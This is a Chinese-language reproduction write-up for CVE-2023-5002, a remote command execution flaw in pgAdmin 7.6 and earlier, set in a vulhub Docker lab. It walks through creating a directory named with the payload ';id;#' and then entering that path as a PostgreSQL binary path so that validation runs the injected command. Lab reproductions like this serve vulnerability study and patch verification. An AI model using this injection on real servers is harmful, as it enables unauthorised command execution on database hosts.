# CVE-2023-5002

> **Create by：** A-little-dragon
>
> **Team：** TracelessSec
>
> **漏洞描述：** PgAdmin 后台远程命令执行漏洞



# 0x01 产品介绍

PgAdmin是一个著名的PostgreSQL数据库管理平台。

# 0x02 影响范围

PgAdmin <= 7.6

# 0x03 环境搭建

使用vulhub环境

```javascript
docker compose up -d
```

 ![](image/c69f1178-8828-470e-a3ad-97ae8984b9fc.png)

# 0x04 漏洞复现

登录PgAdmin。

```javascript
账号：vulhub@example.com
密码：vulhub
```

选择“Tools -> Storage Manager”打开文件管理器：

 ![](image/1753fe09-d0df-475e-8b8a-88b147a4b782.png)

创建一个新的目录，名字是我们的Payload 

```javascript
";id;#
```

 ![](image/0579b4bc-2a5b-43f5-b0f8-da8067dde3cc.png)这个目录的完整路径是`/var/lib/pgadmin/storage/vulhub_example.com/";id;#`，我们后续就需要使用这个路径来利用漏洞。

选择“File -> Preferences”打开设置页面，并来到“Paths -> Binary paths”面板。在任意一个“PostgreSQL Binary Path”文本框中填入

```javascript
/var/lib/pgadmin/storage/vulhub_example.com/";id;#
```

并点击右侧的“验证”按钮

 ![](image/a9612770-0ef4-4622-9d15-4324899ba811.png)

发现执行成功！

 ![](image/6b8e2af6-2ddb-4f2d-a2f6-239b60913a54.png)